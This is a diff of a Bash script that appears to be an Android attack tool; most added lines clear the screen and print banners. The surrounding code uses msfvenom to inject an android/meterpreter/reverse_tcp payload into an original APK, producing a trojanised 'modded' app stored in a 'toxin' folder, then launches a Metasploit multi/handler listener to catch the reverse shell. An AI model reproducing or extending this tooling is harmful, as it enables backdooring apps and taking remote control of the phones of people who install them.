@@ -49,11 +49,17 @@ function setup() {
 #function lhost
 function get_lhost()
 {
+    clear
+    ascii
+    echo ""
   	read -rp "Enter LHOST : " LHOST
 }
 #function lport
 function get_lport()
 {
+    clear
+    ascii
+    echo ""
     read -rp "Enter LPORT : " LPORT
 }
 #function payload
@@ -63,28 +69,59 @@ function get_payload()
 }
 function modded_apk()
 {
+    clear
+    ascii
+    echo ""
     read -rp "Enter Modded Apk Name : " mod_apk
 }
 #function original apk
 function original_apk()
 {
+    clear
+    ascii
+    echo ""
     read -rp "Enter Original apk path : " orig_apk
 }
 function gen_payload() {
+    clear
+    ascii
+    echo "$green"
+    echo "Starting Metasploit, might take some time. $normal"
     msfvenom -x $orig_apk -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $mod_apk
+    if [ -e "$mod_apk" ]
+    then
+        clear
+        ascii
+        mkdir -p ~/storage/shared/toxin
+        mv $mod_apk ~/storage/shared/toxin
+        echo ""
+        echo "$aqua Your apk was stored at /storage/emulated/0/toxin/$mod_apk $normal"
+    else
+        echo "$orange Try with different apk. This apk looks sus.$normal"
+    fi
 }
 function listener_lhost()
 {
+    clear
+    ascii
+    echo ""
   	read -rp "Enter LHOST : " l_host
 }
 #function lport
 function listener_lport()
 {
+    clear
+    ascii
+    echo ""
     read -rp "Enter LPORT : " l_port
 }
 function start_handler() {
     listener_lhost
     listener_lport
+    clear
+    ascii
+    echo "$green"
+    echo "Starting Metasploit, might take some time. $normal"
     msfconsole -x "use multi/handler; set LHOST $l_host ; set LPORT $l_port ; set PAYLOAD $PAYLOAD ; exploit"
 }
 function update()
